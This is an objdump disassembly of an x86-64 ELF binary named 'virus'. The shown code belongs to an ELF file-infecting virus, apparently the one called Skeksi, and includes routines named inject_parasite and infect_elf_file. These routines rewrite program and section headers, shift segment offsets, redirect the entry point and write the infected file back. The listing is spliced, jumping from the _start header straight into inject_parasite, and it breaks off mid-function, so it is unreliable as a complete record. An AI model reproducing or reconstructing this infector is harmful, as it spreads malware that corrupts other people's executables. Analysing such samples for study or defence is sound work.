
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  400810:	eb 4a                	jmp    40085c <inject_parasite+0x29c>
  400812:	48 83 45 f0 40       	add    QWORD PTR [rbp-0x10],0x40
  400817:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40081e:	83 e8 40             	sub    eax,0x40
  400821:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
  400824:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
  400827:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40082a:	48 98                	cdqe   
  40082c:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  400830:	48 89 ce             	mov    rsi,rcx
  400833:	48 89 c7             	mov    rdi,rax
  400836:	e8 10 19 00 00       	call   40214b <_write>
  40083b:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40083e:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400841:	3b 45 a8             	cmp    eax,DWORD PTR [rbp-0x58]
  400844:	74 07                	je     40084d <inject_parasite+0x28d>
  400846:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40084b:	eb 0f                	jmp    40085c <inject_parasite+0x29c>
  40084d:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400850:	89 c7                	mov    edi,eax
  400852:	e8 a0 18 00 00       	call   4020f7 <_close>
  400857:	b8 00 00 00 00       	mov    eax,0x0
  40085c:	c9                   	leave  
  40085d:	c3                   	ret    

000000000040085e <infect_elf_file>:
  40085e:	f3 0f 1e fa          	endbr64 
  400862:	55                   	push   rbp
  400863:	48 89 e5             	mov    rbp,rsp
  400866:	48 81 ec 00 01 00 00 	sub    rsp,0x100
  40086d:	48 89 bd 08 ff ff ff 	mov    QWORD PTR [rbp-0xf8],rdi
  400874:	48 89 b5 00 ff ff ff 	mov    QWORD PTR [rbp-0x100],rsi
  40087b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  400882:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400889:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  40088d:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  400891:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400898:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  40089c:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  4008a0:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4008a4:	48 25 00 f0 ff ff    	and    rax,0xfffffffffffff000
  4008aa:	48 05 00 10 00 00    	add    rax,0x1000
  4008b0:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4008b4:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008bb:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  4008bf:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  4008c3:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4008c7:	48 83 c0 09          	add    rax,0x9
  4008cb:	c7 00 25 5d 01 00    	mov    DWORD PTR [rax],0x15d25
  4008d1:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008d8:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4008db:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  4008df:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008e6:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4008ea:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  4008ee:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008f5:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  4008f9:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  4008fd:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400901:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  400905:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  400909:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40090d:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  400911:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400915:	48 01 c2             	add    rdx,rax
  400918:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40091c:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  400920:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400924:	48 83 c0 38          	add    rax,0x38
  400928:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40092c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400930:	48 83 c0 38          	add    rax,0x38
  400934:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400938:	48 01 ca             	add    rdx,rcx
  40093b:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  40093f:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400946:	e9 37 03 00 00       	jmp    400c82 <infect_elf_file+0x424>
  40094b:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  40094f:	74 4b                	je     40099c <infect_elf_file+0x13e>
  400951:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400954:	48 63 d0             	movsxd rdx,eax
  400957:	48 89 d0             	mov    rax,rdx
  40095a:	48 c1 e0 03          	shl    rax,0x3
  40095e:	48 29 d0             	sub    rax,rdx
  400961:	48 c1 e0 03          	shl    rax,0x3
  400965:	48 89 c2             	mov    rdx,rax
  400968:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40096c:	48 01 d0             	add    rax,rdx
  40096f:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400973:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400976:	48 63 d0             	movsxd rdx,eax
  400979:	48 89 d0             	mov    rax,rdx
  40097c:	48 c1 e0 03          	shl    rax,0x3
  400980:	48 29 d0             	sub    rax,rdx
  400983:	48 c1 e0 03          	shl    rax,0x3
  400987:	48 89 c2             	mov    rdx,rax
  40098a:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40098e:	48 01 d0             	add    rax,rdx
  400991:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400995:	48 01 ca             	add    rdx,rcx
  400998:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  40099c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40099f:	48 63 d0             	movsxd rdx,eax
  4009a2:	48 89 d0             	mov    rax,rdx
  4009a5:	48 c1 e0 03          	shl    rax,0x3
  4009a9:	48 29 d0             	sub    rax,rdx
  4009ac:	48 c1 e0 03          	shl    rax,0x3
  4009b0:	48 89 c2             	mov    rdx,rax
  4009b3:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009b7:	48 01 d0             	add    rax,rdx
  4009ba:	8b 00                	mov    eax,DWORD PTR [rax]
  4009bc:	83 f8 01             	cmp    eax,0x1
  4009bf:	0f 85 1f 02 00 00    	jne    400be4 <infect_elf_file+0x386>
  4009c5:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009c8:	48 63 d0             	movsxd rdx,eax
  4009cb:	48 89 d0             	mov    rax,rdx
  4009ce:	48 c1 e0 03          	shl    rax,0x3
  4009d2:	48 29 d0             	sub    rax,rdx
  4009d5:	48 c1 e0 03          	shl    rax,0x3
  4009d9:	48 89 c2             	mov    rdx,rax
  4009dc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009e0:	48 01 d0             	add    rax,rdx
  4009e3:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  4009e6:	83 f8 05             	cmp    eax,0x5
  4009e9:	0f 85 f5 01 00 00    	jne    400be4 <infect_elf_file+0x386>
  4009ef:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009f2:	48 63 d0             	movsxd rdx,eax
  4009f5:	48 89 d0             	mov    rax,rdx
  4009f8:	48 c1 e0 03          	shl    rax,0x3
  4009fc:	48 29 d0             	sub    rax,rdx
  4009ff:	48 c1 e0 03          	shl    rax,0x3
  400a03:	48 89 c2             	mov    rdx,rax
  400a06:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a0a:	48 01 d0             	add    rax,rdx
  400a0d:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400a11:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400a15:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a18:	48 63 d0             	movsxd rdx,eax
  400a1b:	48 89 d0             	mov    rax,rdx
  400a1e:	48 c1 e0 03          	shl    rax,0x3
  400a22:	48 29 d0             	sub    rax,rdx
  400a25:	48 c1 e0 03          	shl    rax,0x3
  400a29:	48 89 c2             	mov    rdx,rax
  400a2c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a30:	48 01 d0             	add    rax,rdx
  400a33:	48 8b 48 10          	mov    rcx,QWORD PTR [rax+0x10]
  400a37:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a3a:	48 63 d0             	movsxd rdx,eax
  400a3d:	48 89 d0             	mov    rax,rdx
  400a40:	48 c1 e0 03          	shl    rax,0x3
  400a44:	48 29 d0             	sub    rax,rdx
  400a47:	48 c1 e0 03          	shl    rax,0x3
  400a4b:	48 89 c2             	mov    rdx,rax
  400a4e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a52:	48 01 c2             	add    rdx,rax
  400a55:	48 89 c8             	mov    rax,rcx
  400a58:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400a5c:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400a60:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a63:	48 63 d0             	movsxd rdx,eax
  400a66:	48 89 d0             	mov    rax,rdx
  400a69:	48 c1 e0 03          	shl    rax,0x3
  400a6d:	48 29 d0             	sub    rax,rdx
  400a70:	48 c1 e0 03          	shl    rax,0x3
  400a74:	48 89 c2             	mov    rdx,rax
  400a77:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a7b:	48 01 d0             	add    rax,rdx
  400a7e:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400a82:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a85:	48 63 d0             	movsxd rdx,eax
  400a88:	48 89 d0             	mov    rax,rdx
  400a8b:	48 c1 e0 03          	shl    rax,0x3
  400a8f:	48 29 d0             	sub    rax,rdx
  400a92:	48 c1 e0 03          	shl    rax,0x3
  400a96:	48 89 c2             	mov    rdx,rax
  400a99:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a9d:	48 01 c2             	add    rdx,rax
  400aa0:	48 89 c8             	mov    rax,rcx
  400aa3:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400aa7:	48 89 42 18          	mov    QWORD PTR [rdx+0x18],rax
  400aab:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400aae:	48 63 d0             	movsxd rdx,eax
  400ab1:	48 89 d0             	mov    rax,rdx
  400ab4:	48 c1 e0 03          	shl    rax,0x3
  400ab8:	48 29 d0             	sub    rax,rdx
  400abb:	48 c1 e0 03          	shl    rax,0x3
  400abf:	48 89 c2             	mov    rdx,rax
  400ac2:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ac6:	48 01 d0             	add    rax,rdx
  400ac9:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400acd:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ad0:	48 63 d0             	movsxd rdx,eax
  400ad3:	48 89 d0             	mov    rax,rdx
  400ad6:	48 c1 e0 03          	shl    rax,0x3
  400ada:	48 29 d0             	sub    rax,rdx
  400add:	48 c1 e0 03          	shl    rax,0x3
  400ae1:	48 89 c2             	mov    rdx,rax
  400ae4:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ae8:	48 01 d0             	add    rax,rdx
  400aeb:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400aef:	48 01 ca             	add    rdx,rcx
  400af2:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400af6:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400af9:	48 63 d0             	movsxd rdx,eax
  400afc:	48 89 d0             	mov    rax,rdx
  400aff:	48 c1 e0 03          	shl    rax,0x3
  400b03:	48 29 d0             	sub    rax,rdx
  400b06:	48 c1 e0 03          	shl    rax,0x3
  400b0a:	48 89 c2             	mov    rdx,rax
  400b0d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b11:	48 01 d0             	add    rax,rdx
  400b14:	48 8b 48 28          	mov    rcx,QWORD PTR [rax+0x28]
  400b18:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b1b:	48 63 d0             	movsxd rdx,eax
  400b1e:	48 89 d0             	mov    rax,rdx
  400b21:	48 c1 e0 03          	shl    rax,0x3
  400b25:	48 29 d0             	sub    rax,rdx
  400b28:	48 c1 e0 03          	shl    rax,0x3
  400b2c:	48 89 c2             	mov    rdx,rax
  400b2f:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b33:	48 01 d0             	add    rax,rdx
  400b36:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400b3a:	48 01 ca             	add    rdx,rcx
  400b3d:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400b41:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b44:	48 63 d0             	movsxd rdx,eax
  400b47:	48 89 d0             	mov    rax,rdx
  400b4a:	48 c1 e0 03          	shl    rax,0x3
  400b4e:	48 29 d0             	sub    rax,rdx
  400b51:	48 c1 e0 03          	shl    rax,0x3
  400b55:	48 89 c2             	mov    rdx,rax
  400b58:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b5c:	48 01 d0             	add    rax,rdx
  400b5f:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400b66:	00 
  400b67:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b6a:	48 63 d0             	movsxd rdx,eax
  400b6d:	48 89 d0             	mov    rax,rdx
  400b70:	48 c1 e0 03          	shl    rax,0x3
  400b74:	48 29 d0             	sub    rax,rdx
  400b77:	48 c1 e0 03          	shl    rax,0x3
  400b7b:	48 89 c2             	mov    rdx,rax
  400b7e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b82:	48 01 d0             	add    rax,rdx
  400b85:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400b89:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400b8d:	c7 45 fc 01 00 00 00 	mov    DWORD PTR [rbp-0x4],0x1
  400b94:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b97:	48 63 d0             	movsxd rdx,eax
  400b9a:	48 89 d0             	mov    rax,rdx
  400b9d:	48 c1 e0 03          	shl    rax,0x3
  400ba1:	48 29 d0             	sub    rax,rdx
  400ba4:	48 c1 e0 03          	shl    rax,0x3
  400ba8:	48 89 c2             	mov    rdx,rax
  400bab:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400baf:	48 01 d0             	add    rax,rdx
  400bb2:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400bb6:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400bb9:	48 63 d0             	movsxd rdx,eax
  400bbc:	48 89 d0             	mov    rax,rdx
  400bbf:	48 c1 e0 03          	shl    rax,0x3
  400bc3:	48 29 d0             	sub    rax,rdx
  400bc6:	48 c1 e0 03          	shl    rax,0x3
  400bca:	48 89 c2             	mov    rdx,rax
  400bcd:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bd1:	48 01 d0             	add    rax,rdx
  400bd4:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400bd8:	48 01 ca             	add    rdx,rcx
  400bdb:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  400bdf:	e9 9a 00 00 00       	jmp    400c7e <infect_elf_file+0x420>
  400be4:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400be7:	48 63 d0             	movsxd rdx,eax
  400bea:	48 89 d0             	mov    rax,rdx
  400bed:	48 c1 e0 03          	shl    rax,0x3
  400bf1:	48 29 d0             	sub    rax,rdx
  400bf4:	48 c1 e0 03          	shl    rax,0x3
  400bf8:	48 89 c2             	mov    rdx,rax
  400bfb:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bff:	48 01 d0             	add    rax,rdx
  400c02:	8b 00                	mov    eax,DWORD PTR [rax]
  400c04:	83 f8 01             	cmp    eax,0x1
  400c07:	75 75                	jne    400c7e <infect_elf_file+0x420>
  400c09:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c0c:	48 63 d0             	movsxd rdx,eax
  400c0f:	48 89 d0             	mov    rax,rdx
  400c12:	48 c1 e0 03          	shl    rax,0x3
  400c16:	48 29 d0             	sub    rax,rdx
  400c19:	48 c1 e0 03          	shl    rax,0x3
  400c1d:	48 89 c2             	mov    rdx,rax
  400c20:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c24:	48 01 d0             	add    rax,rdx
  400c27:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  400c2b:	48 85 c0             	test   rax,rax
  400c2e:	74 4e                	je     400c7e <infect_elf_file+0x420>
  400c30:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c33:	48 63 d0             	movsxd rdx,eax
  400c36:	48 89 d0             	mov    rax,rdx
  400c39:	48 c1 e0 03          	shl    rax,0x3
  400c3d:	48 29 d0             	sub    rax,rdx
  400c40:	48 c1 e0 03          	shl    rax,0x3
  400c44:	48 89 c2             	mov    rdx,rax
  400c47:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c4b:	48 01 d0             	add    rax,rdx
  400c4e:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  400c51:	83 e0 02             	and    eax,0x2
  400c54:	85 c0                	test   eax,eax
  400c56:	74 26                	je     400c7e <infect_elf_file+0x420>
  400c58:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c5b:	48 63 d0             	movsxd rdx,eax
  400c5e:	48 89 d0             	mov    rax,rdx
  400c61:	48 c1 e0 03          	shl    rax,0x3
  400c65:	48 29 d0             	sub    rax,rdx
  400c68:	48 c1 e0 03          	shl    rax,0x3
  400c6c:	48 89 c2             	mov    rdx,rax
  400c6f:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c73:	48 01 d0             	add    rax,rdx
  400c76:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400c7d:	00 
  400c7e:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400c82:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c86:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  400c8a:	0f b7 c0             	movzx  eax,ax
  400c8d:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400c90:	0f 8c b5 fc ff ff    	jl     40094b <infect_elf_file+0xed>
  400c96:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  400c9a:	75 0c                	jne    400ca8 <infect_elf_file+0x44a>
  400c9c:	48 c7 c0 ff ff ff ff 	mov    rax,0xffffffffffffffff
  400ca3:	e9 e3 01 00 00       	jmp    400e8b <infect_elf_file+0x62d>
  400ca8:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400cac:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400cb0:	48 8d 50 40          	lea    rdx,[rax+0x40]
  400cb4:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400cb8:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400cbc:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400cc0:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400cc4:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400cc8:	48 01 d0             	add    rax,rdx
  400ccb:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  400ccf:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400cd3:	0f b7 40 3e          	movzx  eax,WORD PTR [rax+0x3e]
  400cd7:	0f b7 c0             	movzx  eax,ax
  400cda:	48 c1 e0 06          	shl    rax,0x6
  400cde:	48 89 c2             	mov    rdx,rax
  400ce1:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400ce5:	48 01 d0             	add    rax,rdx
  400ce8:	48 8b 50 18          	mov    rdx,QWORD PTR [rax+0x18]
  400cec:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400cf0:	48 01 d0             	add    rax,rdx
  400cf3:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  400cf7:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400cfe:	e9 1d 01 00 00       	jmp    400e20 <infect_elf_file+0x5c2>
  400d03:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d06:	48 98                	cdqe   
  400d08:	48 c1 e0 06          	shl    rax,0x6
  400d0c:	48 89 c2             	mov    rdx,rax
  400d0f:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d13:	48 01 d0             	add    rax,rdx
  400d16:	8b 00                	mov    eax,DWORD PTR [rax]
  400d18:	89 c2                	mov    edx,eax
  400d1a:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  400d1e:	48 01 d0             	add    rax,rdx
  400d21:	ba 05 00 00 00       	mov    edx,0x5
  400d26:	48 8d 35 f5 20 00 00 	lea    rsi,[rip+0x20f5]        # 402e22 <display_skeksi+0xa4>
  400d2d:	48 89 c7             	mov    rdi,rax
  400d30:	e8 dd 1e 00 00       	call   402c12 <_strncmp>
  400d35:	85 c0                	test   eax,eax
  400d37:	0f 85 aa 00 00 00    	jne    400de7 <infect_elf_file+0x589>
  400d3d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d40:	48 98                	cdqe   
  400d42:	48 c1 e0 06          	shl    rax,0x6
  400d46:	48 89 c2             	mov    rdx,rax
  400d49:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d4d:	48 01 d0             	add    rax,rdx
  400d50:	48 c7 40 18 40 00 00 	mov    QWORD PTR [rax+0x18],0x40
  400d57:	00 
  400d58:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d5b:	48 98                	cdqe   
  400d5d:	48 c1 e0 06          	shl    rax,0x6
  400d61:	48 89 c2             	mov    rdx,rax
  400d64:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d68:	48 01 c2             	add    rdx,rax
  400d6b:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400d6f:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400d73:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400d77:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d7a:	48 98                	cdqe   
  400d7c:	48 c1 e0 06          	shl    rax,0x6
  400d80:	48 89 c2             	mov    rdx,rax
  400d83:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d87:	48 01 d0             	add    rax,rdx
  400d8a:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  400d8e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d91:	48 98                	cdqe   
  400d93:	48 c1 e0 06          	shl    rax,0x6
  400d97:	48 89 c1             	mov    rcx,rax
  400d9a:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d9e:	48 01 c8             	add    rax,rcx
  400da1:	48 83 c2 40          	add    rdx,0x40
  400da5:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  400da9:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400dac:	48 98                	cdqe   
  400dae:	48 c1 e0 06          	shl    rax,0x6
  400db2:	48 89 c2             	mov    rdx,rax
  400db5:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400db9:	48 01 d0             	add    rax,rdx
  400dbc:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400dc0:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400dc7:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400dcb:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400dce:	48 98                	cdqe   
  400dd0:	48 c1 e0 06          	shl    rax,0x6
  400dd4:	48 89 c6             	mov    rsi,rax
  400dd7:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400ddb:	48 01 f0             	add    rax,rsi
  400dde:	48 01 ca             	add    rdx,rcx
  400de1:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400de5:	eb 35                	jmp    400e1c <infect_elf_file+0x5be>
  400de7:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400dea:	48 98                	cdqe   
  400dec:	48 c1 e0 06          	shl    rax,0x6
  400df0:	48 89 c2             	mov    rdx,rax
  400df3:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400df7:	48 01 d0             	add    rax,rdx
  400dfa:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400dfe:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e01:	48 98                	cdqe   
  400e03:	48 c1 e0 06          	shl    rax,0x6
  400e07:	48 89 c2             	mov    rdx,rax
  400e0a:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400e0e:	48 01 d0             	add    rax,rdx
  400e11:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400e15:	48 01 ca             	add    rdx,rcx
  400e18:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400e1c:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400e20:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e24:	0f b7 40 3c          	movzx  eax,WORD PTR [rax+0x3c]
  400e28:	0f b7 c0             	movzx  eax,ax
  400e2b:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400e2e:	0f 8c cf fe ff ff    	jl     400d03 <infect_elf_file+0x4a5>
  400e34:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e38:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400e3c:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400e40:	48 01 c2             	add    rdx,rax
  400e43:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
